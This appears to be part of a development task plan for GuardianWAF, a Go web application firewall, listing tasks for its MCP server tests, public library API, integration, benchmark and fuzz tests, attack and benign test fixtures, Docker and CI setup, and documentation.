Test suite for MCP server and tools. Server tests: initialize handshake, tools/list returns all 15 tools, unknown method returns error, invalid JSON returns parse error, malformed params return invalid params error. Tool tests: each tool tested with valid input and expected output, each tool tested with invalid input and expected error. Integration test: simulate a complete MCP session — initialize, list tools, call get_stats, add a whitelist entry, verify with get_config, check a request, get events. Use `io.Pipe` for stdin/stdout simulation. Verify JSON-RPC message format (id, jsonrpc version, result/error structure).

**Acceptance Criteria:**
- [ ] Server handshake tested
- [ ] tools/list tested
- [ ] Each of 15 tools tested with valid input
- [ ] Each tool tested with invalid input
- [ ] JSON-RPC error format verified
- [ ] Full session integration test
- [ ] stdin/stdout simulation via io.Pipe
- [ ] Concurrent tool calls tested
- [ ] All tests pass

---

## Phase 8: Polish (Tasks 77–90)

### Task 77: Public API — guardianwaf.go [M]

**Files:** `guardianwaf.go`

**Dependencies:** Task 11, Task 8

**Description:**
Implement the public API for library mode (`import "github.com/guardianwaf/guardianwaf"`). This is the primary entry point for users embedding GuardianWAF in their Go applications. Functions: `NewFromFile(path string, opts ...Option) (*WAF, error)` — create WAF from config file with functional options, `New(opts ...Option) (*WAF, error)` — create WAF with defaults and functional options only (no file). `WAF` struct methods: `Middleware() func(http.Handler) http.Handler` — returns standard middleware, `Check(r *http.Request) (*Result, error)` — manual request checking (returns Result with Action, Score, Findings), `OnEvent(fn func(Event))` — register event callback, `Close() error` — graceful shutdown. `Config() *config.Config` — read current config. `Result` is a simplified public struct (not the internal Event). Keep the public API surface minimal — power users access internal packages directly. All public types documented with Go doc comments and examples.

**Acceptance Criteria:**
- [ ] `NewFromFile` creates WAF from config file
- [ ] `New` creates WAF with defaults and options
- [ ] `Middleware()` returns standard Go HTTP middleware
- [ ] `Check()` returns simplified Result struct
- [ ] `OnEvent()` registers event callbacks
- [ ] `Close()` performs graceful shutdown
- [ ] `Config()` returns current configuration
- [ ] Minimal public API surface
- [ ] All public types have Go doc comments
- [ ] All tests pass

---

### Task 78: Functional Options — options.go [S]

**Files:** `options.go`

**Dependencies:** Task 77

**Description:**
Implement the functional options pattern for WAF configuration. `Option` type: `type Option func(*options)`. Internal `options` struct holds all configurable values. Options: `WithMode(mode string)` — "standalone", "library", "sidecar", `WithThreshold(n int)` — detection threshold, `WithParanoia(level int)` — paranoia level 1-4, `WithDetectors(names ...string)` — enable only specified detectors, `WithoutDetectors(names ...string)` — disable specified detectors, `WithRateLimit(requests int, window time.Duration)` — simple rate limit, `WithWhitelist(cidrs ...string)` — IP whitelist, `WithBlacklist(cidrs ...string)` — IP blacklist, `WithEventHandler(fn func(Event))` — event callback, `WithLogger(w io.Writer)` — custom log output, `WithDashboard(addr string)` — enable dashboard on address, `WithTLS(certFile, keyFile string)` — enable TLS. Options override config file values. Validate option combinations (e.g., sidecar mode cannot have dashboard).

**Acceptance Criteria:**
- [ ] `Option` type defined as functional option
- [ ] All specified options implemented
- [ ] Options override config file values
- [ ] Option validation (incompatible combinations rejected)
- [ ] Options compose correctly (multiple options applied in order)
- [ ] Each option documented with Go doc comment
- [ ] All tests pass

---

### Task 79: Public API Tests [M]

**Files:** `guardianwaf_test.go`

**Dependencies:** Task 77, Task 78

**Description:**
Test suite for the public API. Tests: `New()` with default options creates working WAF, `NewFromFile()` loads config correctly, `WithThreshold()` changes detection behavior, `WithParanoia()` adjusts scoring, `WithDetectors()` limits active detectors, `Middleware()` integrates with `net/http` (use `httptest`), `Check()` returns correct Result for attack and benign payloads, `OnEvent()` callback fires on block, `Close()` cleans up resources, multiple options compose correctly, invalid options return error, `Config()` returns current config. Example tests (testable examples): basic middleware usage, manual check usage, custom event handler. Verify the library mode works end-to-end: create WAF, wrap handler, send attack request, verify block.

**Acceptance Criteria:**
- [ ] Default WAF creation tested
- [ ] Config file loading tested
- [ ] All functional options tested individually
- [ ] Option composition tested
- [ ] Middleware integration tested with httptest
- [ ] Check() tested with attack and benign inputs
- [ ] OnEvent callback tested
- [ ] Close() resource cleanup tested
- [ ] Testable examples included
- [ ] End-to-end library mode test
- [ ] All tests pass

---

### Task 80: Integration Tests [L]

**Files:** `internal/engine/integration_test.go`

**Dependencies:** Task 30, Task 33, Task 36, Task 43, Task 45, Task 49

**Description:**
Full end-to-end integration tests that exercise the complete request lifecycle. Setup: create a real Engine with all layers (IP ACL, Rate Limit, Sanitizer, Detection, Bot Detect, Response), configure a test backend with `httptest.Server`, create a reverse proxy pointing to it. Test scenarios: (1) benign GET request passes through all layers, reaches backend, response returned with security headers, (2) SQLi attack in query parameter detected and blocked at detection layer, never reaches backend, (3) XSS payload in POST body detected and blocked, (4) rate limited IP receives 429 with Retry-After, (5) blacklisted IP blocked at IP ACL layer (fastest rejection), (6) whitelisted IP bypasses all checks, (7) multi-vector attack (SQLi + XSS in same request) accumulates scores, (8) path exclusion allows SQLi-like input on excluded path, (9) response masking redacts credit card in backend response, (10) WebSocket upgrade passes through to backend, (11) config reload during traffic (no dropped requests), (12) 1000 concurrent requests with mixed attack/benign (verify no race conditions, correct block rate).

**Acceptance Criteria:**
- [ ] Full pipeline with all layers active
- [ ] Benign request end-to-end pass-through
- [ ] SQLi detection and block verified
- [ ] XSS detection and block verified
- [ ] Rate limiting with 429 response
- [ ] IP ACL whitelist and blacklist
- [ ] Score accumulation across detectors
- [ ] Path exclusions functional
- [ ] Response masking functional
- [ ] Concurrent load test (1000 requests, no race)
- [ ] Config reload during traffic
- [ ] `go test -race` passes
- [ ] All tests pass

---

### Task 81: Benchmark Tests [M]

**Files:** `internal/engine/benchmark_test.go`, `internal/layers/detection/sqli/benchmark_test.go`, `internal/layers/detection/xss/benchmark_test.go`

**Dependencies:** Task 80

**Description:**
Performance benchmarks for every critical path. Benchmarks: (1) `BenchmarkEngine_BenignRequest` — full pipeline with benign input, (2) `BenchmarkEngine_AttackRequest` — full pipeline with attack input, (3) `BenchmarkSQLiTokenizer` — tokenize 100-char input, (4) `BenchmarkSQLiDetector` — full SQLi detection on query param, (5) `BenchmarkXSSScanner` — full XSS detection on body, (6) `BenchmarkNormalize` — all normalization functions, (7) `BenchmarkRadixTree_Lookup` — IP lookup in 10K-entry tree, (8) `BenchmarkTokenBucket` — rate limit check, (9) `BenchmarkPipeline_AllLayers` — all layers with real detectors, (10) `BenchmarkJSONMarshal` — event JSON serialization. Each benchmark includes `b.ReportAllocs()`. Target: full pipeline under 1ms for benign requests (p99). Include `BenchmarkParallel` variants for concurrent performance. Document results in benchmark output comments.

**Acceptance Criteria:**
- [ ] Benchmark for each major component
- [ ] Full pipeline benchmark under 1ms target for benign
- [ ] Allocation tracking with ReportAllocs
- [ ] Parallel benchmarks for concurrent performance
- [ ] SQL tokenizer under 1 microsecond target
- [ ] Radix tree lookup under 500ns target
- [ ] At least 10 distinct benchmarks
- [ ] Benchmarks are reproducible and stable
- [ ] All benchmarks compile and run

---

### Task 82: Fuzz Tests [M]

**Files:** `internal/layers/detection/sqli/fuzz_test.go`, `internal/layers/detection/xss/fuzz_test.go`, `internal/layers/sanitizer/fuzz_test.go`, `internal/config/fuzz_test.go`

**Dependencies:** Task 19, Task 22, Task 13, Task 2

**Description:**
Implement Go native fuzz tests (`testing.F`) for security-critical components. Fuzz targets: (1) `FuzzSQLiDetector` — feed random strings to SQLi tokenizer and detector, verify no panics, no index-out-of-bounds, (2) `FuzzXSSScanner` — feed random strings to HTML scanner, verify no panics, (3) `FuzzURLNormalize` — feed random strings to URL decoder, verify no panics, verify idempotency (normalizing twice gives same result), (4) `FuzzYAMLParser` — feed random bytes to YAML parser, verify no panics (malformed input returns error, not panic). Seed each fuzzer with known attack payloads from testdata and known edge cases (empty string, very long string, null bytes, unicode). Each fuzz function should also verify invariants: output length is bounded, no nil pointer dereferences.

**Acceptance Criteria:**
- [ ] Fuzz test for SQLi tokenizer/detector
- [ ] Fuzz test for XSS scanner
- [ ] Fuzz test for URL normalizer
- [ ] Fuzz test for YAML parser
- [ ] Seeded with known attack payloads
- [ ] No panics on random input (verified by fuzzing)
- [ ] Idempotency check for normalizer
- [ ] Output length bounds checked
- [ ] All fuzz tests compile and run with `go test -fuzz`

---

### Task 83: Test Fixtures [L]

**Files:** `testdata/attacks/sqli.txt`, `testdata/attacks/xss.txt`, `testdata/attacks/lfi.txt`, `testdata/attacks/cmdi.txt`, `testdata/attacks/xxe.txt`, `testdata/attacks/ssrf.txt`, `testdata/benign/queries.txt`, `testdata/benign/bodies.txt`, `testdata/benign/headers.txt`, `testdata/configs/minimal.yml`, `testdata/configs/full.yml`, `testdata/configs/sidecar.yml`, `testdata/configs/invalid.yml`

**Dependencies:** Task 20, Task 23, Task 25, Task 27, Task 28, Task 29

**Description:**
Create comprehensive test fixture datasets. Attack payloads: curate from public WAF testing datasets (OWASP, PayloadsAllTheThings) and original research. Each file contains one payload per line, with comments (`#`) documenting the attack technique. Minimum counts: SQLi 100+, XSS 80+, LFI 50+, CMDi 40+, XXE 30+, SSRF 30+. Benign datasets: realistic non-malicious inputs that resemble attacks — English text with SQL keywords, HTML content, file paths, URLs with encoded characters, API payloads. Config fixtures: `minimal.yml` (smallest valid config), `full.yml` (every option specified), `sidecar.yml` (sidecar-mode config), `invalid.yml` (multiple validation errors for testing error reporting). All payloads tested against detection to verify expected results. Document false positive candidates separately.

**Acceptance Criteria:**
- [ ] SQLi payloads: 100+ covering all categories
- [ ] XSS payloads: 80+ covering all vector types
- [ ] LFI payloads: 50+ with encoding variations
- [ ] CMDi payloads: 40+ for Linux and Windows
- [ ] XXE payloads: 30+ with various entity types
- [ ] SSRF payloads: 30+ with IP encoding tricks
- [ ] Benign inputs: 50+ realistic non-malicious inputs
- [ ] Config fixtures: minimal, full, sidecar, invalid
- [ ] Comment annotations documenting techniques
- [ ] All payloads verified against detectors

---

### Task 84: Dockerfile and docker-compose.yml [S]

**Files:** `Dockerfile`, `docker-compose.yml`

**Dependencies:** Task 70

**Description:**
Create production Docker configuration. `Dockerfile`: multi-stage build — stage 1 (`builder`): use `golang:1.22-alpine`, copy source, run `go build` with `-ldflags` for version info, static linking (`CGO_ENABLED=0`). Stage 2 (`runtime`): use `alpine:3.19` (or `scratch` for absolute minimum), copy binary from builder, copy default config, create non-root user (`guardianwaf`), expose ports 8080 (HTTP), 8443 (HTTPS), 9090 (dashboard), set entrypoint to binary. Labels: maintainer, description, version. `docker-compose.yml`: GuardianWAF service with volume mount for config and certs, environment variable overrides, health check (`/healthz`), resource limits (256MB memory, 0.5 CPU). Optional services: example backend (nginx), second backend (for load balancing demo). Networks: `waf-net` bridge network.

**Acceptance Criteria:**
- [ ] Multi-stage build (builder + runtime)
- [ ] Static binary with version info
- [ ] Non-root user in runtime image
- [ ] Ports exposed: 8080, 8443, 9090
- [ ] docker-compose with WAF service
- [ ] Volume mounts for config and certs
- [ ] Environment variable support
- [ ] Health check configured
- [ ] Resource limits set
- [ ] Optional example backend services
- [ ] `docker build` succeeds
- [ ] `docker-compose up` starts cleanly

---

### Task 85: Example Configs and Code [M]

**Files:** `examples/standalone/main.go`, `examples/standalone/config.yml`, `examples/library/main.go`, `examples/sidecar/config.yml`, `examples/sidecar/deployment.yml`, `examples/kubernetes/deployment.yml`, `examples/kubernetes/service.yml`, `examples/kubernetes/configmap.yml`

**Dependencies:** Task 77, Task 70, Task 71

**Description:**
Create working examples for all deployment modes. **Standalone** (`examples/standalone/`): `config.yml` with two backends, all detectors enabled, dashboard enabled, rate limiting configured. `main.go` showing how to run standalone with custom config. **Library** (`examples/library/`): `main.go` demonstrating `guardianwaf.New()` with options, wrapping a handler, custom event handling, graceful shutdown — complete runnable example. **Sidecar** (`examples/sidecar/`): `config.yml` minimal sidecar config. `deployment.yml` Kubernetes pod spec with sidecar container alongside an app container. **Kubernetes** (`examples/kubernetes/`): `deployment.yml` for standalone deployment, `service.yml` (LoadBalancer type), `configmap.yml` for WAF configuration. All examples must compile and run (or be valid YAML for k8s).

**Acceptance Criteria:**
- [ ] Standalone example with complete config
- [ ] Library example compiles and demonstrates all public API
- [ ] Sidecar example with Kubernetes pod spec
- [ ] Kubernetes deployment manifests
- [ ] All Go examples compile (`go build ./examples/...`)
- [ ] All YAML is valid
- [ ] Examples include comments explaining key decisions
- [ ] Config examples demonstrate real-world settings

---

### Task 86: GitHub Actions CI/CD [M]

**Files:** `.github/workflows/ci.yml`, `.github/workflows/release.yml`

**Dependencies:** Task 1

**Description:**
Create GitHub Actions workflows. **ci.yml** (runs on push and PR): matrix: Go 1.22.x and 1.23.x on ubuntu-latest. Steps: checkout, setup Go, cache modules, `go mod tidy` + check no diff, `golangci-lint run`, `go test -race -cover ./...` (with coverage report), `go test -bench=. ./...` (benchmarks run but don't fail on regression), `go build ./cmd/guardianwaf` for linux/amd64+arm64 and darwin/amd64+arm64 and windows/amd64. Upload coverage to step summary. Fail on: lint errors, test failures, build failures. **release.yml** (runs on tag push `v*`): checkout, setup Go, run GoReleaser (uses `.goreleaser.yml`), create GitHub Release with changelog, upload binaries, build and push Docker image to GitHub Container Registry (`ghcr.io`).

**Acceptance Criteria:**
- [ ] CI runs on push and PR
- [ ] Go version matrix (1.22, 1.23)
- [ ] Module tidy check
- [ ] Lint check with golangci-lint
- [ ] Tests with race detector and coverage
- [ ] Cross-platform build verification
- [ ] Release workflow on tag push
- [ ] GoReleaser integration
- [ ] Docker image build and push to GHCR
- [ ] Coverage summary in PR

---

### Task 87: Build and Benchmark Scripts [S]

**Files:** `scripts/build.sh`, `scripts/benchmark.sh`

**Dependencies:** Task 81

**Description:**
Create helper scripts for development. **build.sh**: cross-compile for all platforms (linux/amd64, linux/arm64, darwin/amd64, darwin/arm64, windows/amd64), set version from git tag (`git describe --tags`), set commit hash, set build date, output to `dist/` directory, create checksums file (SHA256), print build summary (binary sizes, build time). **benchmark.sh**: run all benchmarks, save output to `benchmarks/$(date).txt`, compare with previous run if exists (using `benchstat` if available, otherwise basic diff), highlight regressions (>10% slower), print summary table. Both scripts: use `set -euo pipefail`, support `-h`/`--help`, colorized output, work on macOS and Linux.

**Acceptance Criteria:**
- [ ] build.sh cross-compiles for 5 platforms
- [ ] Version info from git tags
- [ ] SHA256 checksums generated
- [ ] Binary size summary printed
- [ ] benchmark.sh runs all benchmarks
- [ ] Benchmark results saved with timestamp
- [ ] Comparison with previous run
- [ ] Regression highlighting
- [ ] Scripts work on macOS and Linux
- [ ] Help text with `-h` flag

---

### Task 88: Documentation [L]

**Files:** `docs/getting-started.md`, `docs/configuration.md`, `docs/detection-engine.md`, `docs/deployment-modes.md`, `docs/api-reference.md`, `docs/mcp-integration.md`, `docs/tuning-guide.md`

**Dependencies:** All previous tasks

**Description:**
Write comprehensive documentation. **getting-started.md**: installation (go install, binary download, Docker), 5-minute quickstart for each mode, first config walkthrough. **configuration.md**: every config option documented with type, default, description, example — organized by section. **detection-engine.md**: how tokenizer-based detection works, scoring system explained, paranoia levels explained with examples, how to write custom exclusions, false positive tuning. **deployment-modes.md**: standalone (architecture diagram in ASCII, config example, production checklist), library (API reference, middleware integration patterns, framework examples), sidecar (Kubernetes deployment, service mesh integration). **api-reference.md**: every REST endpoint with request/response examples, authentication setup. **mcp-integration.md**: MCP protocol overview, tool list with parameter schemas, example sessions with AI assistants. **tuning-guide.md**: reducing false positives (exclusions, threshold adjustment, paranoia level), increasing security (paranoia 3-4, stricter rate limits), performance tuning (connection pools, buffer sizes).

**Acceptance Criteria:**
- [ ] Getting started covers all 3 deployment modes
- [ ] Every config option documented
- [ ] Detection engine mechanics explained clearly
- [ ] Scoring and paranoia system documented with examples
- [ ] All API endpoints documented with examples
- [ ] MCP tools documented with parameter schemas
- [ ] Tuning guide covers FP reduction and security hardening
- [ ] ASCII architecture diagrams included
- [ ] All code examples are correct and runnable
- [ ] Clear, consistent writing style

---

### Task 89: llms.txt [S]

**Files:** `llms.txt`

**Dependencies:** Task 88

**Description:**
Create the `llms.txt` file following the llms.txt standard (proposal for providing LLM-friendly project summaries). Contents: project name and one-line description, project purpose and key design decisions, architecture overview (layers, pipeline, scoring), file structure with brief description of each package, public API summary (key types, functions, interfaces), configuration overview (main sections and key options), common tasks (how to add a detector, how to add a whitelist rule, how to tune thresholds), links to detailed docs. Format: plain text, max 4000 tokens, structured with clear headings. This file helps AI coding assistants understand the project quickly.

**Acceptance Criteria:**
- [ ] Follows llms.txt format conventions
- [ ] Project purpose clearly stated
- [ ] Architecture overview with layer pipeline
- [ ] File structure with package descriptions
- [ ] Public API summary
- [ ] Configuration overview
- [ ] Common task instructions
- [ ] Under 4000 tokens
- [ ] Accurate and up-to-date with implementation

---

### Task 90: Final Integration Verification [M]

**Files:** No new files — verification task

**Dependencies:** All previous tasks (77–89)

**Description:**
Final verification that everything works together. Run the complete test and build pipeline: (1) `go mod tidy` — verify no changes (clean module), (2) `golangci-lint run` — zero warnings, (3) `go test -race -cover ./...` — all tests pass, coverage > 70%, (4) `go test -bench=. -benchmem ./...` — all benchmarks run, verify performance targets (pipeline < 1ms p99), (5) `go test -fuzz=Fuzz -fuzztime=30s ./internal/layers/detection/sqli/` (and other fuzz targets) — no crashes, (6) `go build -o dist/guardianwaf ./cmd/guardianwaf` for all platforms — all compile, (7) run the binary in standalone mode with example config, send test requests, verify blocks and passes, (8) run in library mode with example code, verify middleware works, (9) verify dashboard loads and displays data, (10) verify MCP server responds to tool calls. Document any issues found, fix them, and re-verify. This task is complete when the project is fully functional end-to-end.

**Acceptance Criteria:**
- [ ] `go mod tidy` produces no changes
- [ ] `golangci-lint` reports zero issues
- [ ] All tests pass with race detector
- [ ] Test coverage exceeds 70%
- [ ] All benchmarks meet performance targets
- [ ] Fuzz tests run 30s with no crashes
- [ ] Binary builds for all 5 platforms
- [ ] Standalone mode functional end-to-end
- [ ] Library mode functional end-to-end
- [ ] Dashboard loads and shows real-time data
- [ ] MCP server responds correctly
- [ ] All examples compile and/or validate
